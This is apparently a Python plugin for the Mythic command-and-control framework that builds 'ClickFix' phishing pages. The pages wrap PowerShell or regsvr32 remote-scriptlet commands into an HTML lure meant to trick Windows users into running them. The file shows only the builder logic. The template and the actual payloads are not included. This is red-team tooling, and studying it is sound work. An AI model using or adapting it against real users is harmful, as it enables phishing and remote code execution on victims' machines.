import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

def get_unique_words(N):

    with open("phishingkit/agent_functions/linuxwords", "r") as f:
        words = list(set(line.strip().lower() for line in f if line.strip()))

    return random.sample(words, N)

class clickfix(PayloadType):
    name = "clickfix"
    file_extension = "html"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
    note = """Creates a clickfix payload"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "phishingkit"
    agent_icon_path = agent_path / "agent_functions" / "basic_python_agent.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            cmd_payload = self.wrapped_payload.decode()
            cmd_payload = cmd_payload.replace('"', '\\"')

            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
            clickfix_template = f.read()
            f.close()

            clickfix_args = {
                "payload": cmd_payload,
            }


            resp.payload = clickfix_template.format(**clickfix_args)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
